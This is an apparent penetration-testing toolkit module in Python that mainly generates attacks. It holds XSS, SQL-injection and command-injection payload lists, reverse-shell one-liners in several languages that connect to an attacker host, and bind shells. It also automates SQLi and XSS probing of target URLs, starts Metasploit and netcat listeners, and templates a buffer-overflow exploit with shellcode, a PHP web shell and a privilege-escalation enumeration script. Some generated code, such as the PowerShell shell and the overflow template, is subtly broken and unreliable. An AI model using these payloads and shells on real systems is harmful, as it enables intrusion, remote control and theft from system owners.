#!/usr/bin/env python3
"""
Pentest-USB Toolkit - Exploit Helpers

This module provides exploit assistance tools and payload generators
for the Pentest-USB Toolkit. Includes payload generation, encoding,
and automated exploitation helpers.

Author: Pentest-USB Team
Version: 1.0.0
"""

import os
import sys
import json
import base64
import urllib.parse
import socket
import struct
import random
import string
import hashlib
import binascii
from typing import List, Dict, Any, Optional, Tuple
import subprocess
import threading
import time
import logging
from pathlib import Path

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PayloadGenerator:
    """Payload generation and encoding utilities"""
    
    def __init__(self):
        self.encoders = {
            'url': urllib.parse.quote,
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'hex': lambda x: x.encode().hex(),
            'html': self._html_encode,
            'unicode': self._unicode_encode
        }
        
    def _html_encode(self, text: str) -> str:
        """HTML encode text"""
        html_chars = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;'
        }
        
        for char, encoded in html_chars.items():
            text = text.replace(char, encoded)
        return text
    
    def _unicode_encode(self, text: str) -> str:
        """Unicode encode text"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def generate_xss_payloads(self, context: str = "generic") -> List[str]:
        """Generate XSS payloads for different contexts"""
        logger.info(f"Generating XSS payloads for context: {context}")
        
        payloads = {
            'generic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')></iframe>"
            ],
            'attribute': [
                "' onmouseover='alert(1)",
                "\" onmouseover=\"alert(1)",
                "' autofocus onfocus='alert(1)",
                "\" autofocus onfocus=\"alert(1)"
            ],
            'script': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "</script><script>alert('XSS')</script>",
                "'-alert('XSS')-'"
            ],
            'url': [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')"
            ]
        }
        
        return payloads.get(context, payloads['generic'])
    
    def generate_sqli_payloads(self, db_type: str = "generic") -> List[str]:
        """Generate SQL injection payloads"""
        logger.info(f"Generating SQL injection payloads for: {db_type}")
        
        payloads = {
            'generic': [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' UNION SELECT NULL--",
                "' OR SLEEP(5)--"
            ],
            'mysql': [
                "' UNION SELECT user()--",
                "' UNION SELECT version()--",
                "' AND SLEEP(5)--",
                "' OR 1=1 LIMIT 1--",
                "' UNION SELECT 1,2,3,4,5--"
            ],
            'postgresql': [
                "' UNION SELECT current_user--",
                "' UNION SELECT version()--",
                "'; SELECT pg_sleep(5)--",
                "' OR 1=1 OFFSET 0--"
            ],
            'mssql': [
                "' UNION SELECT @@version--",
                "' UNION SELECT user_name()--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR 1=1 ORDER BY 1--"
            ]
        }
        
        return payloads.get(db_type, payloads['generic'])
    
    def generate_command_injection_payloads(self, os_type: str = "linux") -> List[str]:
        """Generate command injection payloads"""
        logger.info(f"Generating command injection payloads for: {os_type}")
        
        payloads = {
            'linux': [
                "; ls",
                "| ls",
                "& ls",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; whoami",
                "$(whoami)",
                "`whoami`",
                "; sleep 5",
                "| sleep 5"
            ],
            'windows': [
                "& dir",
                "| dir",
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "& whoami",
                "| whoami",
                "& ping -n 5 127.0.0.1",
                "| ping -n 5 127.0.0.1"
            ]
        }
        
        return payloads.get(os_type, payloads['linux'])
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload with specified encoding"""
        if encoding in self.encoders:
            return self.encoders[encoding](payload)
        else:
            logger.warning(f"Unknown encoding: {encoding}")
            return payload
    
    def generate_encoded_variants(self, payload: str) -> Dict[str, str]:
        """Generate multiple encoded variants of a payload"""
        variants = {'original': payload}
        
        for encoding, encoder in self.encoders.items():
            try:
                variants[encoding] = encoder(payload)
            except Exception as e:
                logger.error(f"Error encoding with {encoding}: {e}")
                variants[encoding] = payload
                
        return variants


class ShellcodeGenerator:
    """Shellcode generation utilities"""
    
    def __init__(self):
        self.arch_sizes = {
            'x86': 4,
            'x64': 8
        }
        
    def generate_reverse_shell(self, lhost: str, lport: int, 
                             shell_type: str = "bash") -> str:
        """Generate reverse shell payload"""
        logger.info(f"Generating {shell_type} reverse shell: {lhost}:{lport}")
        
        shells = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        return shells.get(shell_type, shells['bash'])
    
    def generate_bind_shell(self, port: int, shell_type: str = "bash") -> str:
        """Generate bind shell payload"""
        logger.info(f"Generating {shell_type} bind shell on port {port}")
        
        shells = {
            'bash': f"nc -lvp {port} -e /bin/bash",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'nc': f"nc -lvp {port} -e /bin/sh"
        }
        
        return shells.get(shell_type, shells['nc'])
    
    def generate_buffer_overflow_pattern(self, length: int) -> str:
        """Generate buffer overflow pattern for offset finding"""
        logger.info(f"Generating buffer overflow pattern of length {length}")
        
        pattern = ""
        chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
        
        for i in range(length):
            pattern += chars[i % len(chars)]
            
        return pattern
    
    def find_offset_in_pattern(self, pattern: str, search_value: str) -> int:
        """Find offset of value in generated pattern"""
        try:
            # Convert hex string to ASCII if needed
            if search_value.startswith('0x'):
                search_value = search_value[2:]
                
            # Try to find as hex bytes (little endian)
            if len(search_value) == 8:  # 4 bytes
                bytes_val = bytes.fromhex(search_value)
                # Reverse for little endian
                reversed_bytes = bytes_val[::-1]
                search_str = reversed_bytes.decode('latin-1', errors='ignore')
                
                offset = pattern.find(search_str)
                if offset >= 0:
                    return offset
                    
            # Try direct string search
            offset = pattern.find(search_value)
            return offset if offset >= 0 else -1
            
        except Exception as e:
            logger.error(f"Error finding offset: {e}")
            return -1


class ExploitAutomation:
    """Automated exploitation helpers"""
    
    def __init__(self):
        self.payload_gen = PayloadGenerator()
        self.shellcode_gen = ShellcodeGenerator()
        
    def auto_sql_injection(self, url: str, param: str, 
                          db_type: str = "generic") -> Dict[str, Any]:
        """Automated SQL injection exploitation"""
        logger.info(f"Attempting automated SQL injection on {url}")
        
        results = {
            'url': url,
            'parameter': param,
            'db_type': db_type,
            'success': False,
            'data_extracted': []
        }
        
        payloads = self.payload_gen.generate_sqli_payloads(db_type)
        
        for payload in payloads:
            try:
                import requests
                test_params = {param: payload}
                response = requests.get(url, params=test_params, timeout=10)
                
                # Check for SQL errors or time delays
                if self._check_sql_success(response, payload):
                    results['success'] = True
                    results['successful_payload'] = payload
                    
                    # Try to extract data
                    data = self._extract_sql_data(url, param, payload, db_type)
                    results['data_extracted'] = data
                    break
                    
            except Exception as e:
                logger.error(f"Error testing payload {payload}: {e}")
                
        return results
    
    def _check_sql_success(self, response, payload: str) -> bool:
        """Check if SQL injection was successful"""
        # Check for SQL errors
        sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'microsoft jet']
        for error in sql_errors:
            if error.lower() in response.text.lower():
                return True
                
        # Check for time-based injection
        if 'sleep' in payload.lower() and response.elapsed.total_seconds() > 4:
            return True
            
        return False
    
    def _extract_sql_data(self, url: str, param: str, 
                         payload: str, db_type: str) -> List[str]:
        """Extract data from SQL injection"""
        import requests
        
        data = []
        
        # Common data extraction queries by database type
        extraction_queries = {
            'mysql': [
                "' UNION SELECT user()--",
                "' UNION SELECT version()--",
                "' UNION SELECT database()--"
            ],
            'postgresql': [
                "' UNION SELECT current_user--",
                "' UNION SELECT version()--",
                "' UNION SELECT current_database()--"
            ],
            'mssql': [
                "' UNION SELECT @@version--",
                "' UNION SELECT user_name()--",
                "' UNION SELECT db_name()--"
            ]
        }
        
        queries = extraction_queries.get(db_type, extraction_queries['mysql'])
        
        for query in queries:
            try:
                test_params = {param: query}
                response = requests.get(url, params=test_params, timeout=10)
                
                # Simple extraction - look for non-HTML content
                if response.status_code == 200:
                    # This is simplified - real implementation would need
                    # sophisticated parsing
                    data.append(f"Query: {query} - Response length: {len(response.text)}")
                    
            except Exception as e:
                logger.error(f"Error extracting data with {query}: {e}")
                
        return data
    
    def auto_xss_exploitation(self, url: str, params: List[str]) -> Dict[str, Any]:
        """Automated XSS exploitation"""
        logger.info(f"Attempting automated XSS exploitation on {url}")
        
        results = {
            'url': url,
            'parameters': params,
            'success': False,
            'vulnerable_params': []
        }
        
        payloads = self.payload_gen.generate_xss_payloads()
        
        for param in params:
            for payload in payloads:
                try:
                    import requests
                    test_params = {param: payload}
                    response = requests.get(url, params=test_params, timeout=10)
                    
                    if payload in response.text:
                        results['success'] = True
                        results['vulnerable_params'].append({
                            'parameter': param,
                            'payload': payload,
                            'reflected': True
                        })
                        logger.info(f"XSS found in parameter: {param}")
                        break
                        
                except Exception as e:
                    logger.error(f"Error testing XSS: {e}")
                    
        return results
    
    def setup_listener(self, port: int, handler_type: str = "nc") -> subprocess.Popen:
        """Setup reverse shell listener"""
        logger.info(f"Setting up {handler_type} listener on port {port}")
        
        handlers = {
            'nc': ['nc', '-lvp', str(port)],
            'socat': ['socat', f'TCP-LISTEN:{port}', 'STDOUT'],
            'metasploit': ['msfconsole', '-q', '-x', 
                          f'use exploit/multi/handler; set payload generic/shell_reverse_tcp; set lport {port}; exploit']
        }
        
        if handler_type in handlers:
            try:
                process = subprocess.Popen(
                    handlers[handler_type],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                logger.info(f"Listener started with PID: {process.pid}")
                return process
                
            except Exception as e:
                logger.error(f"Error starting listener: {e}")
                return None
        else:
            logger.error(f"Unknown handler type: {handler_type}")
            return None
    
    def generate_exploit_template(self, exploit_type: str, 
                                target_info: Dict[str, Any]) -> str:
        """Generate exploit template code"""
        logger.info(f"Generating exploit template for: {exploit_type}")
        
        templates = {
            'buffer_overflow': self._generate_bof_template(target_info),
            'web_shell': self._generate_web_shell_template(target_info),
            'privilege_escalation': self._generate_privesc_template(target_info)
        }
        
        return templates.get(exploit_type, "# Unknown exploit type")
    
    def _generate_bof_template(self, target_info: Dict[str, Any]) -> str:
        """Generate buffer overflow exploit template"""
        template = f"""#!/usr/bin/env python3
# Buffer Overflow Exploit Template
# Target: {target_info.get('target', 'Unknown')}
# Generated by Pentest-USB Toolkit

import socket
import struct

target_ip = "{target_info.get('ip', '127.0.0.1')}"
target_port = {target_info.get('port', 9999)}

# Adjust these values based on your analysis
offset = {target_info.get('offset', 'XXXX')}
ret_address = struct.pack("<L", 0x41414141)  # Replace with actual return address

# Your shellcode here
shellcode = (
    "\\x90" * 16 +  # NOP sled
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"
)

# Build the payload
payload = (
    "A" * offset +
    ret_address +
    "\\x90" * 16 +  # NOP sled
    shellcode
)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload)
    s.close()
    print("[+] Exploit sent!")
except Exception as e:
    print(f"[-] Error: {{e}}")
"""
        return template
    
    def _generate_web_shell_template(self, target_info: Dict[str, Any]) -> str:
        """Generate web shell exploit template"""
        template = f"""<?php
// Simple Web Shell
// Target: {target_info.get('target', 'Unknown')}
// Generated by Pentest-USB Toolkit

if(isset($_GET['cmd'])) {{
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
}} else {{
    echo "<form method='GET'>";
    echo "<input type='text' name='cmd' placeholder='Enter command'>";
    echo "<input type='submit' value='Execute'>";
    echo "</form>";
}}
?>
"""
        return template
    
    def _generate_privesc_template(self, target_info: Dict[str, Any]) -> str:
        """Generate privilege escalation template"""
        template = f"""#!/bin/bash
# Privilege Escalation Script
# Target: {target_info.get('target', 'Unknown')}
# Generated by Pentest-USB Toolkit

echo "[+] Starting privilege escalation checks..."

# Check for SUID files
echo "[*] Checking SUID files..."
find / -perm -4000 2>/dev/null

# Check sudo permissions
echo "[*] Checking sudo permissions..."
sudo -l

# Check for writable directories
echo "[*] Checking world-writable directories..."
find / -type d -perm -002 2>/dev/null

# Check running processes
echo "[*] Checking running processes..."
ps aux

echo "[+] Enumeration complete!"
"""
        return template


def main():
    """Main function for testing"""
    print("=== Pentest-USB Exploit Helpers ===")
    
    # Test payload generation
    payload_gen = PayloadGenerator()
    xss_payloads = payload_gen.generate_xss_payloads("generic")
    print(f"Generated {len(xss_payloads)} XSS payloads")
    
    # Test shellcode generation
    shellcode_gen = ShellcodeGenerator()
    reverse_shell = shellcode_gen.generate_reverse_shell("192.168.1.100", 4444, "bash")
    print(f"Reverse shell payload: {reverse_shell}")
    
    # Test pattern generation
    pattern = shellcode_gen.generate_buffer_overflow_pattern(100)
    print(f"Buffer overflow pattern (first 50 chars): {pattern[:50]}")
    
    # Test exploit automation
    exploit_auto = ExploitAutomation()
    template = exploit_auto.generate_exploit_template("buffer_overflow", {
        'target': 'test-app',
        'ip': '192.168.1.100',
        'port': 9999,
        'offset': 146
    })
    print("Generated exploit template:")
    print(template[:200] + "...")


if __name__ == "__main__":
    main()